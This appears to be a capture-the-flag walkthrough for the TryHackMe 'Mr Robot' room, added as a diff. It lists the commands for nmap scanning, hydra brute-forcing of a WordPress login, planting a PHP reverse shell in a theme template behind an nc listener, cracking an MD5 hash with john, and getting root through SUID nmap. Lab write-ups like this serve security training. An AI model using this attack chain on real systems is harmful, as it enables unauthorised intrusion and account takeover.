@@ -1,0 +1,118 @@
+----------------                               ------------------
+               :::::::::::;| MR ROBOT |;::::::::::::
+
+
+1) FIRST WE HAVE TO ACCES THE TRYHACKME FROM OPENVPN.
+2) WE HAVE TO JOIN THE ROOM "MR ROBOT".
+ 
+TASK - 1 (RECON)
+
+1. SCAN THE MACHNE.
+
+    namp -Pn <ip>
+
+    nmap -A -T 5 <ip> -vv
+
+"it's a Linux machine".
+
+2. How many ports are open?
+ANS: 2 ports (80/HTTP, 443/HTTPS).
+
+3. What's on the website?
+ANS: Cool Mr. Robot terminal-style interface!
+
+----------TASK 1 COMPLETED----------
+
+TASK - 2 (WEB EXPLOIT)
+
+1. FIND ROBOTS.TXT.
+
+    http://<ip>/robots.txt
+    "FOUND fsocity.dic and key-1-of-3.txt"
+    "FIRST FLAG GET!"
+
+2. CHECK LOGIN PAGE.
+
+    http://<ip>/wp-login.php
+    "WordPress site - let's brute force!"
+
+----------TASK 2 COMPLETED-----------
+ 
+TASK - 3 (BRUTE FORCE)
+
+1. PREP WORDLIST.
+
+    wget http://<ip>/fsocity.dic
+    sort fsocity.dic | uniq > wordlist.txt
+
+2. HYDRA TIME!
+
+    hydra -l elliot -P wordlist.txt <ip> http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:Invalid username"
+    "FOUND PASSWORD: ER28-0652"
+
+----------TASK 3 COMPLETED-----------
+
+TASK-4 (GET SHELL)
+
+1. LOGIN TO WORDPRESS.
+
+    Use creds elliot:ER28-0652
+    "Edit 404.php template with PHP reverse shell"
+
+2. GET REVERSE SHELL.
+
+    nc -lvnp 4444
+    Access http://<ip>/wp-content/themes/twentyfifteen/404.php
+    "BOOM! WE'RE IN AS DAEMON!"
+
+----------TASK 4 COMPLETED-----------
+
+TASK-5 (PRIV ESC)
+
+1. FIND USER FLAG.
+
+    find / -name user* 2>/dev/null
+    cat /home/robot/key-2-of-3.txt
+
+2. GET ROBOT'S PASS.
+
+    cat /home/robot/password.raw-md5
+    "HASH: c3fcd3d76192e4007dfb496cca67e13b"
+    "CRACK IT WITH JOHN:"
+    john --format=raw-md5 --wordlist=rockyou.txt hash.txt
+    "PASSWORD: abcdefghijklmnopqrstuvwxyz"
+
+3. SU TO ROBOT.
+
+    su robot
+    Password: abcdefghijklmnopqrstuvwxyz
+    "NOW WE'RE ROBOT!"
+
+----------TASK 5 COMPLETED-----------
+
+TASK-6 (ROOT ESCALATION)
+
+1. CHECK SUDO.
+
+    sudo -l
+    "NOPE! Let's find SUID bins"
+
+2. FIND SUID.
+
+    find / -perm -4000 2>/dev/null
+    "/usr/local/bin/nmap has SUID bit - WTF?"
+
+3. EXPLOIT NMAP.
+
+    nmap --interactive
+    !sh
+    "BOOM! ROOT SHELL!"
+
+FLAGS:
+    cat /root/key-3-of-3.txt
+    cat /home/robot/key-2-of-3.txt
+    cat /media/usb/key-1-of-3.txt
+
+-------------------                                                --------------------
+             -----------                                    ------------
+                  ---------- MR ROBOT PWNED ----------
